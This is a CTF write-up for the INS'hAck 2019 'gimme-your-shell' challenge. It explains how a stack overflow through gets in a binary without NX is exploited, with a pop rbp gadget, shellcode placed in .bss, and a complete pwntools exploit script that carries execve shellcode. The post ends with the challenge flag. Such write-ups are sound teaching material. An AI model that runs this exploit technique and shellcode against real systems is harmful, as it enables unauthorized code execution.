---
title: "Give Me Your Shell"
date: 2019-05-06T18:39:04+02:00
categories:
- write-ups
- inshack-2019
tags:
- pwn
- reverse
keywords:
- pwn
- reverse
coverImage: /images/inshack-2019/bg.png
coverSize: full
coverMeta: in
metaAlignment: center
autoThumbnailImage: false
summary : "Write-up about the challenge gimme-your-shell from the inshack-2019 CTF."
---

|  Event | Challenge | Category | Points | Solves |
|:----------:|:------------:|:------------:|:------------:|:------------:|
| inshack-2019 |  gimme-your-shell  |  pwn  | 50 |  67  |

# TL;DR

This is a remote buffer overflow challenge, there is no protection on the binary but ASLR is enable on the remote server. I redirected the execution flow to write my shellcode to a controled area, then jump to it and execute it.

# Getting informations

First I looked at the protections on the binary :

{{< image classes="fancybox fig-100 center" src="/images/inshack-2019/protections.png" thumbnail="/images/inshack-2019/protections.png" >}}

No protections is enabled but it's a remote challenge and we can assume that the ASLR is enabled on the remote server. Let keep that in mind and try to run the binary. 

{{< image classes="fancybox fig-100" src="/images/inshack-2019/crash.png" thumbnail="/images/inshack-2019/crash.png" >}}

The program crash when the input is to big. The binary is not stripped which means that we can find symbol inside the binary by opening it with ghidra we can easily spot the {{< hl-text orange >}}vuln{{< /hl-text >}} function which use a vulnerable function to get input from the user. Here {{< hl-text orange >}}gets{{< /hl-text >}} will read the user input from STDIN and the result will be stored in {{< hl-text orange >}}local_18{{< /hl-text >}} but there is no check on the size of the user input, we have our buffer overflow.

{{< image classes="fancybox fig-100" src="/images/inshack-2019/ghidra.png" thumbnail="/images/inshack-2019/ghidra.png" >}}

# Road to the exploit

Since ASLR is randomizing the stack addresses we can't find the address of our payload and jump to it. We could try to leak an address of libc and perform a ret2libc but I didn't use this technique because it's an 64 bits binary and there is no easy way to control the register {{< hl-text orange >}}rdi{{< /hl-text >}} which is used to pass the first arguments. So without a gadget to properly set {{< hl-text orange >}}rdi{{< /hl-text >}} we can't make a call to {{< hl-text orange >}}puts{{< /hl-text >}} with the address of {{< hl-text orange >}}gets{{< /hl-text >}} as parameter to leak it's address. But remember the NX bit is not set, here is a definition from wikipedia :

{{< blockquote >}}
An operating system with support for the NX bit may mark certain areas of memory as non-executable. The processor will then refuse to execute any code residing in these areas of memory. The general technique, known as executable space protection, is used to prevent certain types of malicious software from taking over computers by inserting their code into another program's data storage area and running their own code from within this section; one class of such attacks is known as the buffer overflow attack. 
{{< /blockquote >}}

So if it's disable we can write data and then execute what we write if it's a valid set of instructions. Now there are 2 problems to solve, where to write the shellcode and how to jump there. 

We can see from the code in ghidra that the parameter of the {{< hl-text orange >}}gets{{< /hl-text >}} function depend of {{< hl-text orange >}}rbp{{< /hl-text >}}

{{< codeblock lang="assembly"  >}}
00400570 48 8d 45 f0     LEA        RAX=>local_18,[RBP + -0x10]
00400574 48 89 c7        MOV        RDI,RAX
00400577 e8 d4 fe        CALL       gets
{{< /codeblock >}}

By chance there is a [gadget](https://thinkloveshare.com/en/hacking/pwn_3of4_saperliropette/) which allow us to set a crafted value in {{< hl-text orange >}}rbp{{< /hl-text >}} :

{{< codeblock lang="assembly"  >}}
ROPgadget --binary weak
[...]
0x0000000000400522 : pop rbp ; ret
[...]
{{< /codeblock >}}

You can use the readelf command to list sections of the binary and their differents rights, we can see that the {{< hl-text orange >}}.bss{{< /hl-text >}} section has write (W) right, it's a perfect candidate to host our shellcode.
{{< codeblock lang="assembly"  >}}
readelf -S weak
[...]
[25] .bss              NOBITS           0000000000600a18  00000a18
    0000000000000010  0000000000000000  WA       0     0     8
[...]
{{< /codeblock >}}


We also have to see where the program crash, I use gdb with the peda extention which allow me to create patterns and search for them : 

{{< codeblock lang="assembly"  >}}
gdb ./weak
gdb-peda$ pattern_create 30
'AAA%AAsAABAA$AAnAACAA-AA(AADAA'
gdb-peda$ r 
{{< /codeblock >}}

{{< image classes="fancybox fig-100" src="/images/inshack-2019/crash-peda.png" thumbnail="/images/inshack-2019/crash-peda.png" >}}

Perfect we can control {{< hl-text orange >}}rip{{< /hl-text >}} which is the instuction pointer at offset 24.

# Building the exploit

So here is the plan : 

- overflow the program until rip
- use the previous gadget to set rbp with a controlled value in bss
- ret to the code in vuln to make a second call to get
- send our shellcode which will be in bss
- jump to our controlled area in bss

{{< codeblock "exploit.py" "python" >}}
from pwn import *

s = process("./connect.sh", shell=True)

shell = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

bss = 0x0600b00                                         # bss WX permissions
offset = 24

stage1 = ""
stage1 += "A" * offset
stage1 += p64(0x0400522)                                # pop rbp
stage1 += p64(bss + 0x10)
stage1 += p64(0x0400570)                                # back to vuln

print s.recvuntil("president.\n").strip()

s.sendline(stage1)

print s.recvuntil("remember !\n").strip()

stage2 = ""
stage2 += "A" * offset
stage2 += p64(0x0600b00 +32)                            # 32 is the lenght of the offset plus the
stage2 += shell                                         #lenght of the 0x0600b00 address

s.sendline(stage2)

print s.recvuntil("remember !\n").strip()
s.interactive()
{{< /codeblock >}}

{{< codeblock "connect.sh" "bash"  >}}
ssh -i ../key.pub -p 2225 user@gimme-your-shell.ctf.insecurity-insa.fr
{{< /codeblock >}}

# Flag

{{< hl-text red >}}INSA{YoU_h4v3_a_b34uT1fUL_Sh33lc0d3}{{< /hl-text >}} 





